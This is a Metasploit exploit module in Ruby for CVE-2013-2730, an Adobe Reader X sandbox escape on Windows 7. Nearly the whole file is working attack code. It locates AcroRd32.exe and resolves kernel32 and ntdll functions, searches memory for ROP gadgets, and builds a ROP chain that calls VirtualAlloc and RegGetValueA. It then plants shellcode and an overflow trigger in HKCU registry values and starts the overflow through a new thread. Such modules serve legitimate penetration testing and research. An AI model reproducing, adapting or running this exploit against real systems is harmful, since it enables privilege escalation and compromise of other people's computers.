##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::EXE
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info, {
      'Name'          => 'AdobeCollabSync Buffer Overflow Adobe Reader X Sandbox Bypass',
      'Description'    => %q{
          This module exploits a vulnerability on Adobe Reader X Sandbox. The
        vulnerability is due to a sandbox rule allowing a Low Integrity AcroRd32.exe
        process to write register values which can be used to trigger a buffer overflow on
        the AdobeCollabSync component, allowing to achieve Medium Integrity Level
        privileges from a Low Integrity AcroRd32.exe process. This module has been tested
        successfully on Adobe Reader X 10.1.4 over Windows 7 SP1.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Felipe Andres Manzano', # Vulnerability discovery and PoC
          'juan vazquez' # Metasploit module
        ],
      'References'    =>
        [
          [ 'CVE', '2013-2730' ],
          [ 'OSVDB', '93355' ],
          [ 'URL', 'http://blog.binamuse.com/2013/05/adobe-reader-x-collab-sandbox-bypass.html' ]
        ],
      'Arch'          => ARCH_X86,
      'Platform'      => 'win',
      'SessionTypes'  => 'meterpreter',
      'Payload'        =>
        {
          'Space'       => 12288,
          'DisableNops' => true
        },
      'Targets'       =>
        [
          [ 'Adobe Reader X 10.1.4 / Windows 7 SP1',
            {
              'AdobeCollabSyncTrigger' => 0x18fa0,
              'AdobeCollabSyncTriggerSignature' => "\x56\x68\xBC\x00\x00\x00\xE8\xF5\xFD\xFF\xFF"
            }
          ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> 'May 14 2013'
    }))

  end

  def on_new_session
    print_status("Deleting Malicious Registry Keys...")
    if not registry_deletekey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\shellcode")
      print_error("Delete HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\shellcode by yourself")
    end
    if not registry_deletekey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\bDeleteDB")
      print_error("Delete HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\bDeleteDB by yourself")
    end
    print_status("Cleanup finished")
  end

  # Test the process integrity level by trying to create a directory on the TEMP folder
  # Access should be granted with Medium Integrity Level
  # Access should be denied with Low Integrity Level
  # Usint this solution atm because I'm experiencing problems with railgun when trying
  # use GetTokenInformation
  def low_integrity_level?
    tmp_dir = expand_path("%TEMP%")
    cd(tmp_dir)
    new_dir = "#{rand_text_alpha(5)}"
    begin
      session.shell_command_token("mkdir #{new_dir}")
    rescue
      return true
    end

    if directory?(new_dir)
      session.shell_command_token("rmdir #{new_dir}")
      return false
    else
      return true
    end
  end

  def check_trigger
    signature = session.railgun.memread(@addresses['AcroRd32.exe'] + target['AdobeCollabSyncTrigger'], target['AdobeCollabSyncTriggerSignature'].length)
    if signature == target['AdobeCollabSyncTriggerSignature']
      return true
    end
    return false
  end

  def collect_addresses
    # find the trigger to launch AdobeCollabSyncTrigger.exe from AcroRd32.exe
    @addresses['trigger'] = @addresses['AcroRd32.exe'] + target['AdobeCollabSyncTrigger']
    vprint_good("AdobeCollabSyncTrigger trigger address found at 0x#{@addresses['trigger'].to_s(16)}")

    # find kernel32.dll
    kernel32 = session.railgun.kernel32.GetModuleHandleA("kernel32.dll")
    @addresses['kernel32.dll'] = kernel32["return"]
    if @addresses['kernel32.dll'] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find kernel32.dll")
    end
    vprint_good("kernel32.dll address found at 0x#{@addresses['kernel32.dll'].to_s(16)}")

    # find kernel32.dll methods
    virtual_alloc = session.railgun.kernel32.GetProcAddress(@addresses['kernel32.dll'], "VirtualAlloc")
    @addresses['VirtualAlloc'] = virtual_alloc["return"]
    if @addresses['VirtualAlloc'] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find VirtualAlloc")
    end
    vprint_good("VirtualAlloc address found at 0x#{@addresses['VirtualAlloc'].to_s(16)}")

    reg_get_value = session.railgun.kernel32.GetProcAddress(@addresses['kernel32.dll'], "RegGetValueA")
    @addresses['RegGetValueA'] = reg_get_value["return"]
    if @addresses['RegGetValueA'] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find RegGetValueA")
    end
    vprint_good("RegGetValueA address found at 0x#{@addresses['RegGetValueA'].to_s(16)}")

    # find ntdll.dll
    ntdll = session.railgun.kernel32.GetModuleHandleA("ntdll.dll")
    @addresses['ntdll.dll'] = ntdll["return"]
    if @addresses['ntdll.dll'] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find ntdll.dll")
    end
    vprint_good("ntdll.dll address found at 0x#{@addresses['ntdll.dll'].to_s(16)}")
  end

  # Search a gadget identified by pattern on the process memory
  def search_gadget(base, offset_start, offset_end, pattern)
    mem  = base + offset_start
    length = offset_end - offset_start
    mem_contents = session.railgun.memread(mem, length)
    return mem_contents.index(pattern)
  end

  # Search for gadgets on ntdll.dll
  def search_gadgets
    ntdll_text_base = 0x10000
    search_length =  0xd6000

    @gadgets['mov [edi], ecx # ret'] = search_gadget(@addresses['ntdll.dll'], ntdll_text_base, search_length, "\x89\x0f\xc3")
    if @gadgets['mov [edi], ecx # ret'].nil?
      fail_with(Exploit::Failure::Unknown, "Unable to find gadget 'mov [edi], ecx # ret'")
    end
    @gadgets['mov [edi], ecx # ret'] += @addresses['ntdll.dll']
    @gadgets['mov [edi], ecx # ret'] += ntdll_text_base
    vprint_good("Gadget 'mov [edi], ecx # ret' found at 0x#{@gadgets['mov [edi], ecx # ret'].to_s(16)}")

    @gadgets['ret'] = @gadgets['mov [edi], ecx # ret'] + 2
    vprint_good("Gadget 'ret' found at 0x#{@gadgets['ret'].to_s(16)}")

    @gadgets['pop edi # ret'] = search_gadget(@addresses['ntdll.dll'], ntdll_text_base, search_length, "\x5f\xc3")
    if @gadgets['pop edi # ret'].nil?
      fail_with(Exploit::Failure::Unknown, "Unable to find gadget 'pop edi # ret'")
    end
    @gadgets['pop edi # ret'] += @addresses['ntdll.dll']
    @gadgets['pop edi # ret'] += ntdll_text_base
    vprint_good("Gadget 'pop edi # ret' found at 0x#{@gadgets['pop edi # ret'].to_s(16)}")

    @gadgets['pop ecx # ret'] = search_gadget(@addresses['ntdll.dll'], ntdll_text_base, search_length, "\x59\xc3")
    if @gadgets['pop ecx # ret'].nil?
      fail_with(Exploit::Failure::Unknown, "Unable to find gadget 'pop ecx # ret'")
    end
    @gadgets['pop ecx # ret'] += @addresses['ntdll.dll']
    @gadgets['pop ecx # ret'] += ntdll_text_base
    vprint_good("Gadget 'pop edi # ret' found at 0x#{@gadgets['pop ecx # ret'].to_s(16)}")
  end

  def store(buf, data, address)
    i = 0
    while (i < data.length)
      buf << [@gadgets['pop edi # ret']].pack("V")
      buf << [address + i].pack("V") # edi
      buf << [@gadgets['pop ecx # ret']].pack("V")
      buf << data[i, 4].ljust(4,"\x00") # ecx
      buf << [@gadgets['mov [edi], ecx # ret']].pack("V")
      i = i + 4
    end
    return i
  end

  def create_rop_chain
    mem = 0x0c0c0c0c

    buf =  [0x58000000 + 1].pack("V")
    buf << [0x58000000 + 2].pack("V")
    buf << [0].pack("V")
    buf << [0x58000000 + 4].pack("V")

    buf << [0x58000000 + 5].pack("V")
    buf << [0x58000000 + 6].pack("V")
    buf << [0x58000000 + 7].pack("V")
    buf << [@gadgets['ret']].pack("V")
    buf << rand_text(8)

    # Allocate Memory To store the shellcode and the necessary data to read the
    # shellcode stored in the registry
    buf << [@addresses['VirtualAlloc']].pack("V")
    buf << [@gadgets['ret']].pack("V")
    buf << [mem].pack("V")        # lpAddress
    buf << [0x00010000].pack("V") # SIZE_T dwSize
    buf << [0x00003000].pack("V") # DWORD flAllocationType
    buf << [0x00000040].pack("V") # flProtect

    # Put in the allocated memory the necessary data in order to read the
    # shellcode stored in the registry
    # 1) The reg sub key: Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions
    reg_key = "Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\x00"
    reg_key_length = store(buf, reg_key, mem)
    # 2) The reg entry: shellcode
    value_key = "shellcode\x00"
    store(buf, value_key, mem + reg_key_length)
    # 3) The output buffer size: 0x3000
    size_buffer = 0x3000
    buf << [@gadgets['pop edi # ret']].pack("V")
    buf << [mem + 0x50].pack("V") # edi
    buf << [@gadgets['pop ecx # ret']].pack("V")
    buf << [size_buffer].pack("V")     # ecx
    buf << [@gadgets['mov [edi], ecx # ret']].pack("V")

    # Copy the shellcode from the the registry to the
    # memory allocated with executable permissions and
    # ret into there
    buf << [@addresses['RegGetValueA']].pack("V")
    buf << [mem + 0x1000].pack("V") # ret to shellcode
    buf << [0x80000001].pack("V")   # hkey => HKEY_CURRENT_USER
    buf << [mem].pack("V")          # lpSubKey
    buf << [mem + 0x3c].pack("V")   # lpValue
    buf << [0x0000FFFF].pack("V")   # dwFlags => RRF_RT_ANY
    buf << [0].pack("V")            # pdwType
    buf << [mem + 0x1000].pack("V") # pvData
    buf << [mem + 0x50].pack("V")   # pcbData
  end

  # Store shellcode and AdobeCollabSync.exe Overflow trigger in the Registry
  def store_data_registry(buf)
    vprint_status("Creating the Registry Key to store the shellcode...")

    if registry_createkey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\shellcode")
      vprint_good("Registry Key created")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to create the Registry Key to store the shellcode")
    end

    vprint_status("Storing the shellcode in the Registry...")

    if registry_setvaldata("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions", "shellcode", payload.encoded, "REG_BINARY")
      vprint_good("Shellcode stored")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to store shellcode in the Registry")
    end

    # Create the Malicious registry entry in order to exploit....
    vprint_status("Creating the Registry Key to trigger the Overflow...")
    if registry_createkey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\bDeleteDB")
      vprint_good("Registry Key created")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to create the Registry Entry to trigger the Overflow")
    end

    vprint_status("Storing the trigger in the Registry...")
    if registry_setvaldata("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions", "bDeleteDB", buf, "REG_BINARY")
      vprint_good("Trigger stored")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to store the trigger in the Registry")
    end
  end

  def trigger_overflow
    vprint_status("Creating the thread to trigger the Overflow on AdobeCollabSync.exe...")
    # Create a thread in order to execute the necessary code to launch AdobeCollabSync
    ret = session.railgun.kernel32.CreateThread(nil, 0, @addresses['trigger'], nil, "CREATE_SUSPENDED", nil)
    if ret['return'] < 1
      print_error("Unable to CreateThread")
      return
    end
    hthread = ret['return']

    vprint_status("Resuming the Thread...")
    # Resume the thread to actually Launch AdobeCollabSync and trigger the vulnerability!
    ret = client.railgun.kernel32.ResumeThread(hthread)
    if ret['return'] < 1
      fail_with(Exploit::Failure::Unknown, "Unable to ResumeThread")
    end
  end

  def check
    @addresses = {}
    acrord32 = session.railgun.kernel32.GetModuleHandleA("AcroRd32.exe")
    @addresses['AcroRd32.exe'] = acrord32["return"]
    if @addresses['AcroRd32.exe'] == 0
      return Msf::Exploit::CheckCode::Unknown
    elsif check_trigger
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Detected
    end
  end

  def exploit
    @addresses = {}
    @gadgets = {}

    print_status("Verifying we're in the correct target process...")
    acrord32 = session.railgun.kernel32.GetModuleHandleA("AcroRd32.exe")
    @addresses['AcroRd32.exe'] = acrord32["return"]
    if @addresses['AcroRd32.exe'] == 0
      fail_with(Exploit::Failure::NoTarget, "AcroRd32.exe process not found")
    end
    vprint_good("AcroRd32.exe found at 0x#{@addresses['AcroRd32.exe'].to_s(16)}")

    print_status("Checking the AcroRd32.exe image...")
    if not check_trigger
      fail_with(Exploit::Failure::NoTarget, "Please check the target, the AcroRd32.exe process doesn't match with the target")
    end

    print_status("Checking the Process Integrity Level...")
    if not low_integrity_level?
      fail_with(Exploit::Failure::NoTarget, "Looks like you don't need this Exploit since you're already enjoying Medium Level")
    end

    print_status("Collecting necessary addresses for exploit...")
    collect_addresses

    print_status("Searching the gadgets needed to build the ROP chain...")
    search_gadgets
    print_good("Gadgets collected...")

    print_status("Building the ROP chain...")
    buf = create_rop_chain
    print_good("ROP chain ready...")

    print_status("Storing the shellcode and the trigger in the Registry...")
    store_data_registry(buf)

    print_status("Executing AdobeCollabSync.exe...")
    trigger_overflow
  end
end
